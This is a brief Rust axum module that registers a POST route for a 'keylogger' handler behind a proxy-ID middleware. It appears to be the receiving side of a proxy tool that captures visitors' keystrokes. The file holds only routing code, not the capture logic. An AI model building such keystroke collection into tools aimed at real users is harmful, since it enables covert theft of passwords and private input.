// mod.rs or lib.rs
pub mod post_keylogger;
use axum::Router;
use axum::middleware::from_fn_with_state;
use axum::routing::post;
pub use post_keylogger::post_keylogger;

use crate::{AppState, middleware};

pub fn keylogger(state: &AppState) -> Router<AppState> {
    Router::new()
        .route("/", post(post_keylogger))
        .layer(from_fn_with_state(
            state.to_owned(),
            middleware::proxy_id_middleware,
        ))
}
